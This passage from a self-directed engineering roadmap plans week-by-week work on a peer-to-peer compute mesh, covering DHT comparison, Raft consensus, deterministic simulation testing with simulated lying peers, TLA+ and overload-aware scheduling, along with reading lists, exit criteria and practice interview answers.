- [ ] **BLAKE3 vs SHA-256 throughput on your machine**, MB/s, with the choice justified
- [ ] Merkle DAG supports **partial fetch** — retrieve one subtree without the whole artifact
- [ ] **GC reclaims unreferenced artifacts without touching referenced ones, proven under concurrent access** — the concurrent test is the one that matters
- [ ] Built on `crashdb`, not on the filesystem, and the durability contract still holds

⛓ **PROBLEM CHAIN**
```
"Filenames diverged silently"    → content addressing → tamper detection by construction
"One byte changed, 500MB resent" → chunking → and fixed-size chunking fails on insertion
"Every boundary shifted"         → content-defined chunking → rolling hash → real DSA
"Hashing is 40% of my CPU"       → BLAKE3, SIMD → measure, don't assume                (→ L0)
"GC deleted a live artifact"     → concurrent refcounting → the subtle bug
"Where do the replicas live?"    → placement → you need a DHT                          (→ L4)
"Two peers agree on the hash"    → …so they agree on the RESULT → verification         (→ L8)
```

## 🎤 INTERVIEW PARAGRAPH — Week 13 (and CV v1)

> The mesh now has its own storage layer, and I built it in two pieces. The first is a storage engine, and the part I'd point at isn't the engine — it's the torture harness that tries to destroy it. It runs a random workload while killing the process at random intervals, and after every restart it checks four invariants: every acknowledged write is present, no unacknowledged write is present, no value is torn, and the index never points outside the file. A thousand cycles in CI. It also injects failures at the syscall level with LD_PRELOAD — a `write` that succeeds but only writes half, an `fsync` that returns EIO. That last one taught me something I'd have got wrong: on some filesystems a failed fsync marks the pages clean anyway, so you cannot retry it, you have to treat it as fatal. That's the bug that hit PostgreSQL.
>
> The second piece is content-addressed storage, where an artifact's key is the hash of its contents. That gives you tamper detection for free and dedup for free. The interesting failure was chunking: I stored a 500MB artifact, changed one byte in the middle, and only re-transferred one chunk — fine. Then I inserted one byte at the *front* and re-transferred the entire 500 megabytes, because every fixed-size chunk boundary shifted. That's why content-defined chunking exists: you cut on a rolling hash of the content rather than on offsets, so an insertion only disturbs its local chunk. I have the dedup-ratio chart for both. And content addressing turns out to be load-bearing for the trust layer later — if job execution is deterministic, two honest peers produce the same output hash, so a peer that disagrees is lying or broken.

## 🎓 LEVEL 3 EXIT EXAM
1. Draw an LSM tree and a B+Tree. Give a workload where each wins decisively, and name the amplification factors.
2. `fsync` returns EIO. What do you do, and why can't you retry?
3. Your torture harness found zero bugs. What do you conclude, and what do you do next?
4. Explain content-defined chunking to someone who knows fixed-size chunking. Give the workload where the difference is total.
5. Why does content addressing make deduplication free *and* tamper detection free? Are those the same property?
6. Your GC deleted an artifact a concurrent job was about to use. What went wrong and how do you fix it without a global lock?
7. Why must the scheduling core have no wall-clock dependency? What becomes possible in month six because of it?

**Pass = 6/7.**

**🔗 DSA companion (W10–13):** **trees/BSTs and heaps** — B+Tree structure and buffer-pool eviction *are* these structures under production constraints. Plus tries (the Merkle DAG is a hash-keyed tree) and hashing problems.

---
---

# ⚡ LEVEL 4 — The DHT

> **Goal:** decide who owns a job or an artifact with no fixed servers, correctly, under continuous churn.
> **⏱ Weeks 14–17 · Dec 7 2026 – Jan 3 2027 · 72h** · **Milestone S4** · **🚩 Flagship #2: `dht-arena`** · **Fundamentals F7, F8**

---

## 4.1 — Consistent hashing, and why naive hashing destroys you

> ### 🔥 THE WALL
> Assign artifacts to peers with `hash(key) % N`. Run 40 peers. Now **one peer leaves.** N becomes 39.
>
> **Recompute: almost every key now maps to a different peer.** Measure it — roughly (N−1)/N of all keys must move. On a mesh with continuous churn, you would spend all your bandwidth relocating data and none of it running jobs. Plot keys-moved against peers-departed for both `mod N` and consistent hashing on the same chart. **The gap is the entire reason consistent hashing exists.**

### 📖 THEORY
- **Consistent hashing** — peers and keys onto one ring; a key belongs to the next peer clockwise. A departure moves only that peer's arc. **Expected keys moved: 1/N, not (N−1)/N.**
- **Virtual nodes** — one physical peer occupies many ring positions, which fixes both load imbalance and the "one departure dumps everything on one neighbour" problem. **Measure load distribution with 1, 10, 100 and 500 vnodes per peer, and plot the variance.**
- **Bounded loads** (Mirrokni/Thorup/Zadimoghaddam) — consistent hashing with a cap, so no peer exceeds (1+ε)× average. Worth implementing; it's a small change with a measurable effect and it comes up in interviews.
- **Replication on the ring** — the next R peers clockwise hold replicas; when one leaves, its successor repairs. State the R you chose and why.

### 📄 SOURCES
- **Karger et al., "Consistent Hashing and Random Trees" (STOC 1997)** — the original.
- **Alex Xu, *System Design Interview* Vol. 1, ch. 5** — consistent hashing, the applied treatment. **You own this book; this is the chapter.**
- **DDIA ch. 6 in full** — partitioning, rebalancing, request routing. The vocabulary you'll write your design doc in.
- **"Consistent Hashing with Bounded Loads"** (Google Research blog + paper).

## 4.2 — 🚩 FLAGSHIP #2: `dht-arena` — Chord and Kademlia, head to head

> ### 🔥 THE WALL
> Consistent hashing tells you *which* peer owns a key. It does not tell you **how to find that peer when you only know 20 of the 1,000 peers in the mesh.** Route by asking a peer you know, who asks a peer they know. Naive version: ask everyone you know, they ask everyone they know. **Traffic explodes and lookups take O(N) hops.**
>
> Then implement Chord's finger table and watch it drop to O(log N). **Then kill 30% of the peers simultaneously mid-lookup and watch your finger tables point at corpses.**

### 📖 THEORY

**Chord:** identifier ring · finger table of *m* entries, entry *i* pointing at the successor of `n + 2^i` · **lookup halves the remaining distance each hop → O(log N)** · successor lists for robustness · stabilisation protocol repairing pointers in the background · join and leave protocols.

**Kademlia:** **XOR metric as distance** — elegant, symmetric (unlike Chord's ring, where A→B distance ≠ B→A), which means you learn routing information from queries you *receive*, not just ones you send · k-buckets holding *k* peers per distance band · **preference for long-lived peers**, which is empirically the right heuristic because uptime predicts uptime · parallel lookups (α concurrent queries) making it far more churn-tolerant.

**The comparison, and why it's the artifact:** Chord is the canonical teaching DHT. **Kademlia is what actually runs the internet** — BitTorrent, IPFS, Ethereum's discovery. Everyone knows both names. **Nobody has published hop counts, lookup success rate, and maintenance traffic for both, on one testbed, under identical churn.** You will.

### 📄 SOURCES
- **Stoica, Morris, Karger, Kaashoek, Balakrishnan, "Chord: A Scalable Peer-to-peer Lookup Service for Internet Applications" (SIGCOMM 2001).**
- **Maymounkov & Mazières, "Kademlia: A Peer-to-peer Information System Based on the XOR Metric" (IPTPS 2002).** Read §2 on the XOR metric properly — the symmetry argument is the whole insight.
- **"Handling Churn in a DHT" (Rhea, Geels, Roscoe, Kubiatowicz, USENIX ATC 2004)** — the paper on exactly what you're benchmarking. Read it *after* you've measured, and compare your numbers to theirs.

### 🛠 THE BUILD · 45h — `swarm-core/dht` (C++), driven from `swarmd`

📈 **EXIT CRITERIA**
- [ ] **Both implemented.** Correct key ownership and lookup on a stable mesh, property-tested
- [ ] **O(log N) hop count verified empirically at 3 mesh sizes** (100, 1,000, 10,000 — the larger two in simulation), plotted against the theoretical curve
- [ ] **Correct lookup under 30% simultaneous churn** — the headline result
- [ ] **THE TABLE:** Chord vs Kademlia × churn rate {0, 10%, 20%, 30%} × {median hops, p99 hops, lookup success rate, maintenance messages/node/minute, time-to-converge after churn}. **Every cell filled.**
- [ ] Consistent hashing vs `mod N`: keys-moved-per-departure, both curves, one chart
- [ ] **Load distribution variance at 1 / 10 / 100 / 500 vnodes per peer**, plotted
- [ ] Bounded-load variant implemented and its effect on the tail of the load distribution measured
- [ ] `docs/analysis/dht-arena.md` — **prose, not a table dump.** Which wins where, *why*, and which SWARM ships. **The XOR-symmetry argument for Kademlia's churn tolerance should be something you derived from your own numbers, not quoted.**
- [ ] Routing-table memory per peer measured for both — this matters at 10,000 nodes

⛓ **PROBLEM CHAIN**
```
"mod N moved every key"        → consistent hashing → virtual nodes → bounded loads
"One departure overloaded a neighbour"→ vnodes → measure the variance
"Lookup took O(N) hops"        → finger tables → O(log N)
"Finger tables pointed at dead peers"→ stabilisation → successor lists → churn tolerance
"Chord degrades faster than Kademlia"→ XOR symmetry → you learn from incoming queries
"Who repairs a lost replica?"  → successor repair → and who decides? → consensus         (→ L5)
"Two peers both think they own K"→ split ownership → you need agreement, not just hashing (→ L5)
```

> **🔗 This is the richest DSA overlap in the roadmap.** Union-find (ring join/leave), graph routing (finger tables are a small-world graph — read about small-world networks, the O(log N) result is the same phenomenon), modular arithmetic, and bit manipulation (XOR distance, k-bucket indexing by leading-zero count). **Track I weeks 14–17 are DP and knapsack; weeks 18–20 are bit manipulation and math. Pull the bit-manipulation set forward into this level** — it maps 1:1 onto Kademlia.

## 🎤 INTERVIEW PARAGRAPH — Week 17

> The mesh routes now, and I implemented two DHTs rather than one, because I wanted the comparison. Chord is the canonical one — a ring, finger tables pointing at exponentially increasing offsets, so each hop halves the remaining distance and lookup is O(log N). Kademlia is what actually runs the internet: BitTorrent, IPFS, Ethereum discovery. Its insight is using XOR as the distance metric, which is *symmetric* — A's distance to B equals B's to A — and that sounds like a detail until you realise it means a node learns routing information from queries it *receives*, not just ones it sends. So under churn, Kademlia repairs itself passively from traffic it was going to handle anyway. I benchmarked both under zero, ten, twenty and thirty percent simultaneous churn and measured median hops, p99 hops, lookup success rate, maintenance traffic per node, and time to converge. That comparison doesn't exist publicly on one testbed, so I published it. Before any of that, though, I made the mistake worth showing: I assigned artifacts with hash mod N, then removed one peer out of forty, and nearly every key remapped. On a mesh with continuous churn you'd spend all your bandwidth relocating data and none of it computing. That chart — keys moved per departure, mod-N versus consistent hashing — is the clearest thing in the repo.

## 🎓 LEVEL 4 EXIT EXAM
1. Why does `hash(key) % N` move ~(N−1)/N of keys on one departure? Derive it.
2. What do virtual nodes fix? Give two distinct problems.
3. Explain Chord's finger table and why lookup is O(log N).
4. Why is XOR symmetry a real advantage for Kademlia under churn? Answer from your own data.
5. 30% of peers vanish simultaneously. What happens to each DHT in the next 60 seconds?
6. Consistent hashing tells you who *should* own key K. Two peers both believe they do. What does the DHT do about that? (Correct answer: nothing — it's not a consensus protocol. Which is why Level 5 exists.)
7. Routing-table memory per peer at 10,000 nodes, both designs. Which scales and why?

**Pass = 6/7.**

---
---

# ⚡ LEVEL 5 — Consensus: Raft

> **Goal:** a region of the mesh agrees on job assignment, so no job is lost and no job runs twice by accident. **The hardest level in the plan.**
> **⏱ Weeks 18–22 · Jan 4 – Feb 7 2027 · 90h** · **Milestone S5** · **🚩 Flagship #3: `raft`** · **🤝 Referral pipeline opens W18** · **Fundamentals F9, F10** · **W22 = buffer + pre-Ramadan pull-forward, 34h**

---

## 5.1 — Why the DHT is not enough

> ### 🔥 THE WALL
> The DHT says peer P owns job J. P accepts it and begins executing. **Now partition P from the rest of the mesh.**
>
> The mesh's failure detector marks P dead. The DHT re-assigns J to peer Q. Q executes it. **The partition heals. P returns with a completed result.** The job ran twice — you paid twice, and if the job had side effects, they happened twice.
>
> Now invert it: **P is slow, not dead.** You cannot distinguish these (DDIA ch. 8, and you proved it in Level 2). If you re-assign, you double-execute. If you don't, a genuinely dead peer's job is lost forever.
>
> **A hash function cannot solve this. You need agreement.**

### 📖 THEORY

- **Why regions, not one global Raft group.** A single Raft group across 10,000 peers is absurd — every commit needs a majority round-trip across the planet, and the group can't tolerate its own membership churn. **SWARM partitions the keyspace into regions; each region has a small Raft group (5 peers) that owns assignment decisions for its arc of the ring.** The DHT decides *which region*; Raft decides *what that region agreed*. **This layering is your central architectural decision and it becomes ADR-0002.**
- **Raft in full:** terms · randomised election timeouts (and why randomisation is what breaks split votes) · RequestVote and the up-to-date-log check · AppendEntries · the **log matching property** · commit index advancement · applying to the state machine · membership changes.
- **🔴 The Figure 8 case** — why a leader may not directly commit an entry from a *previous* term, and the no-op-on-election fix. **This is the subtle part of Raft, it is what interviewers probe, and you must be able to draw it.**
- **Read-only optimisations** — ReadIndex and lease reads: how etcd serves linearizable reads without a log write. Worth implementing; it's the difference between a toy and something usable.
- **Leases and fencing tokens** — a lease-holder whose lease expired **must not be able to commit.** A TTL-based lock is not a lock in an asynchronous system. Kleppmann's argument, applied to job assignment.
- **What consensus does NOT give you.** It does not prevent double *execution* — only double *assignment*. A peer that accepted an assignment, got partitioned, and completed the job will still have run it. **Your exactly-once story is: at-most-once assignment via Raft, plus idempotent side effects, plus result deduplication by content hash.** Say that precisely; claiming exactly-once execution is a claim you cannot support.
- **Consistency models** — place SWARM on the map: what is linearizable (job assignment within a region), what is causal, what is eventual (membership, reputation). This is F9's exercise and it becomes ADR-0003.

### 📄 SOURCES
- **Ongaro & Ousterhout, "In Search of an Understandable Consensus Algorithm" — the EXTENDED version.** §5 in full, §6 (membership changes) carefully. The conference version omits crucial detail.
- **Ongaro's PhD thesis** — for log compaction and membership changes done properly.
- **Jon Gjengset, "Students' Guide to Raft"** — the single most useful supplement while implementing. Read it before you start, not when you're stuck.
- **DDIA ch. 9 in full** (consistency and consensus), **ch. 5** replication-lag section for vocabulary.
- **Jepsen's consistency model map** (`jepsen.io/consistency`) — one page. Memorise the hierarchy.
- **Kleppmann, "How to do distributed locking"** — then antirez's reply. **Read both.** Fencing tokens.
- **`thesecretlivesofdata.com/raft/`** — the visualisation, for intuition before the paper.
- *Optional, if you have slack in W22:* **Fly.io Gossip Glomers 1–4** — Maelstrom checks your consistency for you, which pairs perfectly with Level 6.

### 🛠 🚩 FLAGSHIP #3 + MILESTONE S5 · 70h

`raft` as a standalone, reusable Go library with its own seeded deterministic test harness, then `swarmd/region` on top of it.

📈 **EXIT CRITERIA**
- [ ] Leader elected from 5 peers; **re-elected within the timeout after a leader kill; no split-brain across 1,000 randomised runs**
- [ ] Log replication with the log-matching property, verified by a property test
- [ ] **Partition test: a minority partition CANNOT commit, across 500 randomised partition schedules.** On heal, the minority's uncommitted entries are correctly overwritten.
- [ ] **The Figure 8 scenario constructed deliberately as a test**, and the commit rule shown to prevent it. Then: **you can draw it at a whiteboard in under five minutes, from memory.** Tested by a human in Week 21.
- [ ] ReadIndex or lease reads implemented; **linearizable reads served without a log write**, with the latency difference measured
- [ ] Membership change (add and remove a peer) without losing availability
- [ ] **Every failure reproducible from a seed integer alone, on any machine.** The harness that makes this true is the thing that makes Level 6 possible.
- [ ] **S5: kill a region leader mid-commit under sustained job submission — no assignment lost, no assignment duplicated.** Verified by a unique-assignment table with a uniqueness constraint.
- [ ] **Fencing tokens: a peer whose lease expired cannot commit its result.** Demonstrate the violation without them, and the fix with them. Two runs, same seed.
- [ ] `docs/design/exactly-once.md` — **what you actually guarantee.** At-most-once assignment + idempotent effects + content-hash dedup. **Do not claim exactly-once execution.**

⛓ **PROBLEM CHAIN**
```
"Partition caused double execution"→ assignment needs agreement, not hashing
"Can't tell slow from dead"        → you never can → design for at-least-once + idempotence
"One global Raft group?"           → absurd at 10k peers → regions → the layering decision
"Split votes never resolved"       → randomised election timeouts → why randomness is load-bearing
"Committed entry vanished"         → Figure 8 → the previous-term commit rule
"Linearizable read cost a log write"→ ReadIndex / lease reads
"Expired lease-holder committed"   → fencing tokens → a TTL is not a lock
"How do I test all of this?"       → you can't by hand → deterministic simulation        (→ L6)
```

## 🎤 INTERVIEW PARAGRAPH — Week 22

> The mesh has consensus now, and the interesting part is *where* I put it. A distributed hash table tells you which peer should own a job, but it's not an agreement protocol — if the network partitions, the failure detector marks a peer dead, the job is reassigned, and then the partition heals and you discover it ran twice. And you can never distinguish a slow peer from a dead one, which is DDIA chapter eight's central point. So assignment needs agreement. But a single Raft group across ten thousand peers is absurd — every commit is a planet-wide majority round trip. So the keyspace is partitioned into regions, each with a five-peer Raft group that owns assignment for its arc of the ring. The DHT picks the region; Raft decides what that region agreed. I implemented Raft from the extended paper, and the part that took longest was Figure 8 — the case where a leader must not directly commit an entry from a previous term. I built that scenario as a deliberate test rather than waiting to hit it. Two things I'd flag. First, fencing tokens: a peer whose lease expired must not be able to commit its result, and I can show you the same seed producing a corruption without them and correctness with them. Second, I'm careful about what I claim. Raft gives me at-most-once *assignment*. It does not give me exactly-once *execution* — a peer that accepted a job and then got partitioned still ran it. My exactly-once story is at-most-once assignment, plus idempotent effects, plus deduplication by content hash, and I'd rather say that precisely than claim something I can't support.

## 🎓 LEVEL 5 EXIT EXAM
1. Draw Raft's Figure 2 from memory.
2. Explain the Figure 8 scenario and the rule that fixes it. Five minutes, whiteboard.
3. Why regions rather than one Raft group? What's the cost of the layering?
4. A minority partition. What can it do, what can't it, and how does it find out?
5. Why is randomising the election timeout load-bearing rather than a detail?
6. Explain fencing tokens. Why is a TTL-based lease insufficient?
7. What does consensus NOT give you here? State SWARM's exactly-once story precisely.
8. Place SWARM on the consistency map, component by component.

**Pass = 7/8.**

**🔗 DSA companion (W18–22):** **union-find** (Chord ring and region membership), reductions and NP-hardness (Skiena ch. 9 — W18 is a *proving* week, three written reductions), bit manipulation and bitmask DP (pull forward for Kademlia), math and modular arithmetic. **W21: first human mock + the Figure 8 whiteboard test.**

---
---

# ⚡ LEVEL 6 — Correctness: Deterministic Simulation & Byzantine Faults

> **Goal:** test combinations of failures you cannot construct by hand — including a peer that lies. **The rarest skill in this document.**
> **⏱ Weeks 23–26 · Feb 8 – Mar 7 2027 · 40h** · **Milestone S6** · **🚩 Flagship #4: `swarmsim`** · **⚑ CV v2** · **W26 = REST WEEK** · **Fundamentals F11**

> ## 🌙 RAMADAN — READ BEFORE STARTING
> **Ramadan 2027 ≈ 8 Feb – 9 Mar**, colliding almost exactly with this level. **Weeks 23–25 are budgeted at 20 hours, not 30.** Week 26 is a rest week at 10h. A deliberate 50-hour reduction.
>
> **Mitigations already applied:** the Will Wilson talk and the FoundationDB paper are watched/read in Week 22; the injectable-port architecture was built in Week 11 (S2), so this level is harness construction, not refactoring; TLA+ is scoped to **one** protocol, not two.
>
> **Do not try to run this at 30 hours.** You will lose Weeks 27 and 28, and Level 7 is not the one to start tired. Week 35 is the buffer that absorbs a slip.
>
> Reduced split: **10h Depth / 5h Interview / 2h Fundamentals / 3h Craft.** The interview track drops to 5h. **It does not stop.**

---

## 6.1 — 🚩 FLAGSHIP #4: `swarmsim`

> ### 🔥 THE WALL
> SWARM passes every test you have. Now answer this: **what happens if the network partitions asymmetrically, then a disk returns EIO, then a clock jumps backward four seconds, then two peers claim the same lease, and then a peer starts returning plausible-but-wrong results — all within the same thirty seconds?**
>
> You cannot construct that by hand. There are millions of orderings. **So make the entire universe deterministic and let a seeded random number generator explore it for you.**

### 📖 THEORY

Replace every source of nondeterminism with a simulated implementation controlled by one seeded PRNG:

```
Real                        Simulated
──────────────────────────────────────────────────────────────────
time.Now()             →    sim.Clock      (advances only when you say)
time.Sleep()           →    sim.Sleep      (instant; advances virtual time)
network / RPC          →    sim.Network    (delay, drop, reorder, duplicate, PARTITION)
disk / fsync           →    sim.Disk       (torn writes, EIO, tail truncation on crash)
goroutine scheduling   →    sim.Scheduler  (deterministic single-threaded interleaving)
rand                   →    rng            (seeded)
a peer's behaviour     →    sim.Peer       (honest | crashed | slow | LYING)  ← the SWARM-specific one
```

Then `for seed := 0; seed < 100_000; seed++ { run(seed) }`. Each run explores a different failure schedule. **When one violates an invariant, you have a seed integer that reproduces it exactly, forever, on any machine.**

**🔴 The SWARM-specific contribution: `LyingNode` as a first-class fault type.** FoundationDB's simulator models crashes, partitions, and disk faults — the *fail-stop* world. It does not model a node that stays up, responds promptly, and returns a wrong answer. **SWARM's entire premise requires that fault**, and modelling it is the thing that makes this simulator different from the ones the technique is famous for. Variants worth injecting: returns a random result · returns a *plausible* result (right shape, wrong value) · returns correct results until it has built reputation, then lies · colludes with another lying node to produce the same wrong answer (**this one defeats naive majority vote at N=3 and finding that is the point**).

**The invariants, checked continuously — not just at the end:**
1. No job is ever assigned to two peers concurrently by the same region
2. Every accepted job eventually completes or is explicitly failed
3. The content store's integrity holds: every referenced artifact is retrievable and hashes correctly
4. **A minority of lying peers never causes an incorrect result to be accepted**
5. No acknowledged job assignment is lost across a leader change
6. Reputation never increases for a peer that returned a rejected result

### 📄 SOURCES
- **Will Wilson, "Testing Distributed Systems w/ Deterministic Simulation" (Strange Loop 2014).** **Watch this in Week 22. It is the single most valuable 40 minutes in this entire roadmap.**
- **Zhou et al., "FoundationDB: A Distributed Unbundled Transactional Key Value Store" (SIGMOD 2021) — §4 on simulation.**
- **TigerBeetle's VOPR and simulation blog posts** — open source, readable, modern. Study the code.
- **Go's `testing/synctest`** and **`madsim`** (Rust) — real implementations of the technique to compare against.

### 🛠 THE BUILD · 30h

📈 **EXIT CRITERIA**
- [ ] All six components: `SimClock`, `SimNetwork` (**including asymmetric partitions**), `SimDisk`, `SimScheduler`, `SimPeer` with the four behaviour modes, and the continuous invariant checker
- [ ] **10,000+ seeds run clean nightly in CI**, each simulating hours of virtual time in milliseconds of real time
- [ ] **🔴 ≥3 real bugs found in SWARM this way, each documented in the README with its seed and a human-readable event trace.** *This is the deliverable.* **A DST harness that finds nothing means your fault injection isn't aggressive enough — go and make it worse.**
- [ ] **Any failure reproducible from its seed alone, on any machine**
- [ ] **A colluding-liars scenario that defeats naive majority vote at N=3**, caught by the invariant checker, with the seed. This directly shapes Level 8's design.
- [ ] Simulated time runs ≥1,000x faster than real time — report the actual factor
- [ ] **A published post: "Three bugs in my distributed system that no test suite would have caught."** With the traces.

## 6.2 — TLA+ on the one protocol that most needs it

> ### 🔥 THE WALL
> Write a TLA+ spec of SWARM's **majority-vote verification** protocol and model-check it. **TLC will find an edge case** — most likely at an exact tie threshold, or where a result arrives from a peer whose lease expired mid-vote. Then find the same bug in your Go implementation.

### 📖 THEORY
PlusCal · states, actions, behaviours · safety vs liveness · invariants and temporal properties · model checking with TLC · state-space explosion and how to bound it. **What TLA+ is for: protocols and concurrent algorithms — not code verification. Spec the 200 lines that matter.**

### 📄 SOURCES
- **Hillel Wayne, `learntla.com`** — free, the best on-ramp. **Ramadan-appropriate: it's reading, not grinding.**
- **Newcombe et al., "How Amazon Web Services Uses Formal Methods", CACM 2015** — read this to understand why it's worth your hours; it lists the specific bugs TLA+ found in DynamoDB that survived extensive testing.

📈 **EXIT CRITERIA**
- [ ] The verification protocol spec model-checks clean for: **"a minority of lying peers can never cause an incorrect result to be accepted"**
- [ ] **≥1 real design bug found by TLC**, documented with the counterexample trace it produced
- [ ] `docs/analysis/tla-vs-dst.md` — **what TLA+ found vs what the simulator found.** They catch *different* classes of bug, and articulating that distinction is a genuinely senior insight.

⛓ **PROBLEM CHAIN**
```
"Can't test 5 simultaneous faults"→ make the universe deterministic → seeded exploration
"Found a bug, can't reproduce it" → seeds → reproducibility is the whole point
"Simulator found nothing"         → your faults are too gentle → make them worse
"Two liars agreed with each other"→ collusion defeats majority-of-3 → reputation, N>3    (→ L8)
"TLC found what tests didn't"     → model checking explores exhaustively, tests sample
"Is the simulator even right?"    → validate against the real mesh → sim-fidelity        (→ L8 W34)
```

## 🎤 INTERVIEW PARAGRAPH — Week 26 (and CV v2)

> This month was correctness, and the technique is deterministic simulation testing — the FoundationDB approach. Every source of nondeterminism in my system is behind an injectable port: the clock, the network, the disk, the scheduler, and the random number generator. In simulation each one is replaced by an implementation driven by a single seeded PRNG, so a whole run — hours of virtual time, thousands of messages, a dozen injected failures — is a pure function of one integer. I run ten thousand seeds nightly, and when one violates an invariant I have a seed that reproduces it exactly, forever, on any machine. It found three real bugs that no test suite of mine would have caught. But the part that's specific to my system is the fault type nobody else models. FoundationDB's simulator models crashes, partitions and disk faults — the fail-stop world. Mine also models a peer that stays up, responds promptly, and returns a *plausible wrong answer*, because my whole premise is running code on strangers' machines. And the run that changed my design was two lying peers colluding to return the *same* wrong answer, which defeats a naive majority vote at three replicas. The simulator found that before I'd written the trust layer, which meant I designed it knowing the attack instead of patching it afterwards.

## 🎓 LEVEL 6 EXIT EXAM
1. Explain deterministic simulation testing to a sceptical manager in 90 seconds, including adoption cost.
2. Name three things that must be true of your architecture for DST to be possible at all.
3. Give an invariant in SWARM that a unit test cannot check but a simulation can.
4. Why is `LyingNode` a different fault class from `CrashedNode`? What does it break that crashes don't?
5. Two liars collude. What happens at N=3? At N=5? What does that imply for your redundancy policy?
6. TLA+ and DST catch different bugs. Give an example of each that the other would miss.
7. Your simulator runs clean for 10,000 seeds. What does that prove, and what does it not?

**Pass = 6/7.**

**🔗 DSA companion (W23–26, reduced to 5h):** **review and re-solve only. No new topics.** State-space search and backtracking is the natural pairing — model checking and DST are structurally a systematic search over execution interleavings — but during Ramadan, keep the streak and re-solve from the failure log. **Do the failure-category count in W26.**

> ### 🚩 HALF-YEAR GATE — end of Week 26
> Six months. Check honestly: **is there a working mesh — peers discovering each other, storing content, routing by DHT, agreeing via Raft, and a simulator that tests all of it?**
>
> If yes, you are on plan, and the second half is where the corpus gaps close.
> If no, read the re-plan triggers in §XV **now**, before Level 7. And reconsider the **Extended Track** — 18 months is a legitimate choice; a rushed Level 7–10 is not.

---
---

# ⚡ LEVEL 7 — Scheduling, Overload & Kubernetes

> **Goal:** decide *which* peer runs a job, and keep the mesh useful when far more work arrives than it can do. **This is where the corpus percentages start closing.**
> **⏱ Weeks 27–30 · Mar 8 – Apr 4 2027 · 70h** · **Milestone S7** · **🚩 Flagship #5: `overload`** · **Core: `gatekeep`** · **Fundamentals F12, F13, F14**
>
> **Eid al-Fitr ≈ Mar 9–11 falls in Week 27** — budgeted at 26h.

---

## 7.1 — Placement: which peer should run this?

> ### 🔥 THE WALL
> Schedule jobs round-robin across peers. Now make one peer 10x slower — **not dead, slow.** Measure end-to-end p99.
>
> Round-robin keeps feeding it. Your p99 is now that peer's p99, and the health check says it's fine because it returns results. Then implement **least-outstanding-jobs** and measure again. Then **power-of-two-random-choices**. The improvement is dramatic, and it explains why every large system's placement is smarter than it looks.
>
> **Then the SWARM-specific wall:** jobs have *resource vectors* — CPU, memory, and sometimes GPU. Peers have capacity vectors. Pack them greedily by CPU alone and watch memory-heavy jobs starve while CPU sits idle. **This is multidimensional bin packing, it is NP-hard, and greedy-by-one-dimension is the classic failure.**

### 📖 THEORY
- **Placement algorithms:** round-robin · least-outstanding · **power of two random choices (P2C)** — near-optimal with almost no coordination, and the result is genuinely beautiful; read it · latency-aware EWMA · consistent hashing for cache/data affinity (**your artifact is already on some peers — placing the job near its data is a real win, measure it**).
- **Multidimensional bin packing** — NP-hard. Heuristics that work: best-fit-decreasing on a scalarised resource vector, dominant-resource fairness (DRF). **You will not solve it optimally; measure how close your heuristic gets to a small-instance optimum computed by brute force.**
- **Data locality vs load balance** — placing near the artifact reduces transfer but concentrates load. **The tradeoff is measurable and it's a good design-doc section.**
- **Health checks:** ⚠️ **A deep health check that verifies a shared dependency fails ALL your peers at once when that dependency blips — converting a degradation into a total outage.** Separate liveness from readiness. **A readiness signal that says "ready" before the peer has its artifacts is worse than none.**

## 7.2 — 🚩 FLAGSHIP #5: `overload` — the goodput curve

> ### 🔥 THE WALL
> Drive the mesh to 3–5x its aggregate capacity with an **open-loop** generator. Plot offered load against **successful job completions per second (goodput)**.
>
> It does not plateau at capacity. **It collapses toward zero** — the mesh spends its resources on jobs that will exceed their deadline before they finish, and every one of those is wasted electricity on someone else's machine.
>
> **That graph is the single most persuasive artifact in performance engineering and almost nobody has produced one.**

### 📖 THEORY
- **Little's Law: `L = λW`.** Concurrency = arrival rate × latency. *"The mesh does 200 jobs/sec averaging 3 seconds, so ~600 jobs are in flight, so a queue bound of 100 is the actual constraint"* is a five-second calculation most engineers never make.
- **The queueing curve.** M/M/1: `W = S/(1−ρ)`. At ρ=0.5, 2× service time. At ρ=0.9, 10×. At ρ=0.99, 100×. **Memorise this shape** — it explains why you don't run at 90% utilisation and why a 20% traffic increase caused a 4x latency increase.
- **Overload responses, in order of effectiveness:** bounded queues → **drop jobs whose deadline has already passed** (cheapest huge win: never work on something nobody is waiting for) → **LIFO under overload** (counterintuitive and correct: FIFO under overload means *everyone* gets a timed-out answer; LIFO means *someone* gets a fresh one) → **adaptive concurrency limits** (infer capacity from observed latency rather than a config number — Netflix's approach, and the modern right answer) → priority shedding.
- **Retry amplification** — 3 retries × 3 hops = 9x, and if retries also time out you get a positive feedback loop. **Retry budgets** (max 10% of traffic may be retries), retry at **one layer only**, exponential backoff with **full jitter**.
- **Metastable failure** — the system stays broken *after* the trigger is removed, because retry load is now self-sustaining. **Recovery requires shedding load, not just fixing the trigger.** Almost nobody knows this by name; it is extremely impressive in a design interview.

### 📄 SOURCES
- **Dean & Barroso, "The Tail at Scale."** Re-read; you're living it now.
- **AWS Builders' Library** — *"Using load shedding to avoid overload"*, *"Timeouts, retries and backoff with jitter"*, *"Avoiding insurmountable queue backlogs"*, *"Workload isolation using shuffle-sharding"*. **Read the whole library across Levels 7–10; it's the best free reliability writing that exists.**
- **Netflix, "Performance Under Load: Adaptive Concurrency Limits"** + the `Netflix/concurrency-limits` source.
- **Google SRE Book ch. 21 (Handling Overload) and ch. 22 (Addressing Cascading Failures).** **Ch. 22 may be the most valuable chapter in the book.**
- **Bronson et al., "Metastable Failures in Distributed Systems" (HotOS 2021).**
- **Mitzenmacher, "The Power of Two Choices in Randomized Load Balancing."**
- **Alex Xu, *System Design Interview* Vol. 1, ch. 1 and ch. 4** — scale estimation and rate limiting. You own it.

### 🛠 THE BUILD · 40h — `swarmd/scheduler`

📈 **EXIT CRITERIA**
- [ ] **Six placement strategies benchmarked** (round-robin, least-outstanding, P2C, EWMA-latency, data-affinity, resource-vector best-fit) against a peer pool where you independently control each peer's speed, error rate and capacity
- [ ] **The slow-peer scenario:** end-to-end p99 for all six, one chart. **Round-robin's failure should be dramatic.**
- [ ] Resource-vector packing: **utilisation achieved vs a brute-force optimum on small instances**, so you know how far off your heuristic is
- [ ] Data-affinity vs load-balance tradeoff measured: artifact transfer bytes saved vs load-variance increase
- [ ] **🔴 THE GOODPUT CHART:** offered load 0.5x→5x capacity vs successful completions/sec, for **six configurations** (naive · bounded queue · +deadline-dropping · +LIFO-under-overload · +adaptive concurrency limit · +priority shedding). **Collapse and graceful on the same axes.**
- [ ] Quantified: *"at 3x overload the naive mesh delivers X% of capacity; the adaptive one delivers Y%."*
